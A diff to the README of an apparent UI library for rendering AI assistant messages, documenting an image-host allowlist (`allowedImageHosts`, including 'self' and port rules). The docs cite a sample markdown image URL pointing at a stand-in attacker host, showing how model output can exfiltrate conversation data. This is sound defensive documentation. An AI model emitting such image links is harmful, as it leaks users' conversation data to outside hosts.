@@ -242,10 +242,14 @@ A whole assistant `UIMessage`, part by part: streaming-safe markdown (unterminat
 />
 ```
 
-Images in text and reasoning do not load unless their host is allowed: a URL in model output can carry data out of the conversation as soon as the browser fetches it (`![](https://attacker.example/p.png?d=…)`), so by default an image renders as a link with its alt text, or as plain text inside the link it belongs to (a badge). Allow the hosts you trust, or `'*'` for any:
+Images in text and reasoning do not load unless they are allowed: a URL in model output can carry data out of the conversation as soon as the browser fetches it (`![](https://attacker.example/p.png?d=…)`), so by default an image renders as a link with its alt text, or as plain text inside the link it belongs to (a badge). `allowedImageHosts` takes:
+
+- host names: `'images.example.com'` matches any port, `'localhost:3000'` only that port;
+- `'self'`: relative URLs such as `/logo.png`, which load from your own origin. Protocol-relative URLs (`//host/x`) are not relative, and absolute URLs to your own site need their host listed. Relative requests carry your cookies, so allow `'self'` only if GET requests to your origin have no side effects;
+- `'*'`: every image.
 
 ```tsx
-<AgentMessage message={last} allowedImageHosts={['images.example.com']} />
+<AgentMessage message={last} allowedImageHosts={['images.example.com', 'self']} />
 ```
 
 `Markdown`, `Reasoning` and `JsonView` are exported on their own as well, and `Markdown` and `Reasoning` take the same `allowedImageHosts`.
